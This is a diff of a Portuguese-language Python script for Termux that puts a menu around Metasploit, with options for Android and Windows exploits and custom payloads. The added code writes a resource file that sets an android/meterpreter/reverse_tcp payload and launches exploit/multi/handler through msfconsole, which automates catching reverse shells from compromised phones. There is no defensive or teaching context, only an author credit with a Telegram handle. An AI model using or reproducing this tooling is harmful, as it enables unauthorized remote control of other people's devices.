@@ -6,12 +6,16 @@ import os.path
 def ver():
 	print "verificando metasploit"
 	time.sleep(0.5)
-	exploit="/exploit"
+	stogare="$HOME/storage"
+	exploit="/sdcard/exploit"
 	ff=str(os.path.exists(exploit))
 	pasta="/data/data/com.termux/files/home/metasploit-framework"
 	patch=str(os.path.exists(pasta))
+	tf=str(os.path.exists(stogare))
 	if ff != "True":
-		os.system("mkdir exploit")
+		os.system("mkdir /sdcard/exploit")
+	elif tf != "True":
+		os.system("termux-setup-storage")
 	elif patch == "True":
 		print "METASPLOIT INSTALADO"
 		time.sleep(1)
@@ -51,7 +55,8 @@ def menu():
 1{exploit para android}
 2{exploit para windows}
 3{payload personalizada}
-4{sair}
+4{iniciar msfconsole}
+5{sair}
 	'''
 	op=int(raw_input("OPÇÃO: "))
 	if op == 1:
@@ -87,6 +92,14 @@ def menu():
 		os.system("clear")
 		print "PRONTO"
 	elif op == 4:
+		port=int(raw_input("LPORTA: "))
+		payload='set payload android/meterpreter/reverse_tcp \nset lhost 0.0.0.0 \nset lport %s \nuse exploit/multi/handler \nexploit'%(port)
+		os.system("echo '%s' > $HOME/payload.rb"%(payload))
+		print "PARA USAR O MSGCONSOLE JA PRONTO USE O COMANDO \nmsfconsole -r payload.rb"
+		time.sleep(1)
+		os.system("msfconsole -r $HOME/payload.rb")
+		os.system("clear")
+	elif op == 5:
 		print "SAINDO..."
 		print "CRIADOR DO SCRIPT: elionay costa\nUSER DO TELEGRAN: @deserq0101"
 		time.sleep(2)
